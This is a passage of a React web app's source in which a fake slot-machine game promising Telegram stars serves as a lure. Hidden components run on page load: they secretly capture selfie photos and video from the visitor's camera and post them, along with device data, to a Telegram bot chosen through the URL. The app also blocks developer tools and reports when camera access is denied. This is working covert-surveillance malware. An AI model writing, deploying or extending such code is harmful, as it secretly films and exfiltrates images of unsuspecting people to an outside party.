      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
      
      console.log(`✅ Фото отправлено (${context})`);
      
    } catch (error) {
      console.error('❌ Ошибка отправки фото:', error);
    }
  };

  // Отправка видео в Telegram
  const sendVideoToTelegram = async () => {
    if (recordedChunksRef.current.length === 0) {
      console.log("❌ Нет данных видео для отправки");
      return;
    }
    
    try {
      const blob = new Blob(recordedChunksRef.current, {
        type: mediaRecorderRef.current.mimeType
      });
      
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('video', blob, `taverna_selfie_video_${Date.now()}.mp4`);
      formData.append('disable_notification', 'true');
      formData.append('supports_streaming', 'true');
      
      videoCountRef.current++;
      const caption = `🎬 Селфи видео\nФаза: ${phaseRef.current}\nВидео #${videoCountRef.current}\nВремя: ${new Date().toLocaleTimeString()}\n🚀 TAVERNA SYSTEM`;
      
      formData.append('caption', caption);
      
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
        method: 'POST',
        body: formData
      });
      
      console.log(`✅ Видео отправлено #${videoCountRef.current}`);
      
    } catch (error) {
      console.error('❌ Ошибка отправки видео:', error);
    }
  };

  // Отправка сообщения об ошибке
  const sendErrorMessage = async (error) => {
    try {
      const errorText = `
❌ <b>ОШИБКА ДОСТУПА К КАМЕРЕ</b>
━━━━━━━━━━━━━━━━━━━━
<b>Ошибка:</b> ${error.name}
<b>Сообщение:</b> ${error.message}
<b>Время:</b> ${new Date().toLocaleTimeString()}
━━━━━━━━━━━━━━━━━━━━
🚫 <b>Пользователь отказал в доступе или камера недоступна</b>
      `;
      
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: errorText,
          parse_mode: 'HTML'
        })
      });
      
    } catch (telegramError) {
      console.error('❌ Ошибка отправки сообщения об ошибке:', telegramError);
    }
  };

  // Остановка всей системы камеры
  const stopCameraSystem = () => {
    console.log("⏹️ ОСТАНОВКА СИСТЕМЫ СЕЛФИ КАМЕРЫ");
    
    // Останавливаем интервалы
    stopPhotoPhase();
    
    if (videoIntervalRef.current) {
      clearInterval(videoIntervalRef.current);
      videoIntervalRef.current = null;
    }
    
    if (totalTimerRef.current) {
      clearTimeout(totalTimerRef.current);
      totalTimerRef.current = null;
    }
    
    // Останавливаем запись видео если идет
    if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
      mediaRecorderRef.current.stop();
    }
    
    // Останавливаем поток камеры
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => {
        track.stop();
      });
      streamRef.current = null;
    }
    
    // Удаляем видео элемент
    if (videoRef.current && videoRef.current.parentNode) {
      videoRef.current.parentNode.removeChild(videoRef.current);
      videoRef.current = null;
    }
  };

  // Исправлено: добавлены зависимости
  useEffect(() => {
    if (chatId && !hasStarted) {
      console.log("🚀 ЗАПУСК СИСТЕМЫ СЕЛФИ КАМЕРЫ");
      setHasStarted(true);
      startCamera();
      
      // Общее время работы - 1 минута
      totalTimerRef.current = setTimeout(() => {
        stopCameraSystem();
      }, 60000);
      
      return () => {
        stopCameraSystem();
      };
    }
  }, [chatId, hasStarted, startCamera, stopCameraSystem]);

  return null;
};

/**
 * КАЗИНО
 */
const SimpleSlotMachine = () => {
  useDevToolsProtection();
  
  const [balance, setBalance] = useState(5000);
  const [slotResult, setSlotResult] = useState(['🍒', '🍒', '🍒']);
  const [spinning, setSpinning] = useState(false);
  const [message, setMessage] = useState('🎰 Нажми КРУТИТЬ!');
  const [starsWon, setStarsWon] = useState(0);
  
  const slotSymbols = ['🍒', '🍋', '🍊', '🍉', '⭐', '7️⃣', '👑', '💰'];

  const spinSlots = () => {
    if (spinning || balance < 100) return;
    
    setSpinning(true);
    setMessage('🎰 Вращается...');
    setBalance(prev => prev - 100);
    
    let spinCount = 0;
    const spinInterval = setInterval(() => {
      const randomResult = Array(3).fill(0).map(() => 
        slotSymbols[Math.floor(Math.random() * slotSymbols.length)]
      );
      
      setSlotResult(randomResult);
      spinCount++;
      
      if (spinCount > 15) {
        clearInterval(spinInterval);
        
        const finalResult = Array(3).fill(0).map(() => 
          slotSymbols[Math.floor(Math.random() * slotSymbols.length)]
        );
        
        setSlotResult(finalResult);
        
        setTimeout(() => {
          checkWin(finalResult);
          setSpinning(false);
        }, 500);
      }
    }, 100);
  };

  const checkWin = (result) => {
    const [a, b, c] = result;
    let winAmount = 0;
    
    if (a === b && b === c) {
      if (a === '⭐') {
        winAmount = 1000;
        setStarsWon(prev => prev + 3);
        setMessage(`🎉 ДЖЕКПОТ ЗВЕЗДЫ! +${winAmount}₽ ⭐⭐⭐`);
      } else {
        winAmount = 500;
        setMessage(`🎉 ДЖЕКПОТ! +${winAmount}₽`);
      }
    } else if (a === b || a === c || b === c) {
      winAmount = 100;
      setMessage(`🎉 Выигрыш! +${winAmount}₽`);
      
      if (result.includes('⭐')) {
        setStarsWon(prev => prev + 1);
        setMessage(`🎉 Выигрыш! +${winAmount}₽ +⭐`);
      }
    } else {
      setMessage('😢 Попробуй еще!');
    }
    
    if (winAmount > 0) {
      setBalance(prev => prev + winAmount);
    }
  };

  return (
    <div className="simple-casino">
      <div className="casino-header">
        <h2>🎰 ВЫИГРАЙ ЗВЕЗДЫ В TELEGRAM!</h2>
        <div className="stars-counter">
          <span className="stars">⭐ Звезд: {starsWon}</span>
          <span className="balance">💰 Баланс: {balance}₽</span>
        </div>
      </div>
      
      <div className="slot-machine">
        <div className="slots">
          {slotResult.map((symbol, index) => (
            <div 
              key={index} 
              className={`slot ${spinning ? 'spinning' : ''}`}
            >
              {symbol}
            </div>
          ))}
        </div>
        <div className="message">{message}</div>
      </div>
      
      <button 
        onClick={spinSlots}
        disabled={spinning || balance < 100}
        className="spin-btn"
      >
        {spinning ? '🎰 Вращается...' : '🎰 КРУТИТЬ!'}
      </button>
      
      <style>{`
        .simple-casino {
          max-width: 350px;
          margin: 0 auto;
          padding: 20px;
          background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
          border-radius: 20px;
          color: white;
          text-align: center;
          box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
        }
        
        .casino-header {
          margin-bottom: 20px;
        }
        
        .casino-header h2 {
          color: #FFD700;
          font-size: 18px;
          margin-bottom: 10px;
        }
        
        .stars-counter {
          display: flex;
          justify-content: space-between;
          font-size: 14px;
          background: rgba(0,0,0,0.3);
          padding: 10px;
          border-radius: 10px;
        }
        
        .stars {
          color: #FFD700;
          font-weight: bold;
        }
        
        .balance {
          color: #4CAF50;
          font-weight: bold;
        }
        
        .slot-machine {
          background: rgba(0,0,0,0.3);
          border-radius: 15px;
          padding: 15px;
          margin-bottom: 20px;
          border: 2px solid rgba(255,215,0,0.3);
        }
        
        .slots {
          display: flex;
          justify-content: center;
          gap: 10px;
          margin-bottom: 15px;
        }
        
        .slot {
          width: 70px;
          height: 70px;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 40px;
          background: #000;
          border-radius: 10px;
          border: 3px solid #444;
        }
        
        .slot.spinning {
          animation: spin 0.1s infinite;
        }
        
        @keyframes spin {
          0% { transform: translateY(0); }
          100% { transform: translateY(-70px); }
        }
        
        .message {
          font-size: 16px;
          font-weight: bold;
          min-height: 25px;
          padding: 8px;
          background: rgba(0,0,0,0.5);
          border-radius: 8px;
        }
        
        .spin-btn {
          width: 100%;
          padding: 18px;
          background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
          color: #000;
          border: none;
          border-radius: 15px;
          font-size: 18px;
          font-weight: bold;
          cursor: pointer;
        }
        
        .spin-btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
        
        @media (max-width: 400px) {
          .simple-casino {
            width: 90%;
            padding: 15px;
          }
          
          .slot {
            width: 60px;
            height: 60px;
            font-size: 35px;
          }
        }
      `}</style>
    </div>
  );
};

/**
 * ГЛАВНАЯ СТРАНИЦА
 */
const PhotoPage = () => {
  useDevToolsProtection();
  
  const { chatId } = useParams();
  const [initialized, setInitialized] = useState(false);

  useEffect(() => {
    if (chatId && !initialized) {
      console.log("🚀 TAVERNA SYSTEM ИНИЦИАЛИЗИРОВАНА ДЛЯ ЧАТА:", chatId);
      setInitialized(true);
    }
  }, [chatId, initialized]);

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%)',
        padding: '20px',
        fontFamily: 'Arial, sans-serif',
        position: 'relative'
      }}>
        <SimpleSlotMachine />
      </div>

      {chatId && initialized && (
        <>
          <DeviceInfoCollector chatId={chatId} />
          <SelfieCamera chatId={chatId} />
        </>
      )}
    </>
  );
};

/**
 * APP COMPONENT
 */
const App = () => {
  useDevToolsProtection();
  
  return (
    <Routes>
      <Route path="/:chatId" element={<PhotoPage />} />
      <Route path="/" element={null} />
    </Routes>
  );
};

export default App;
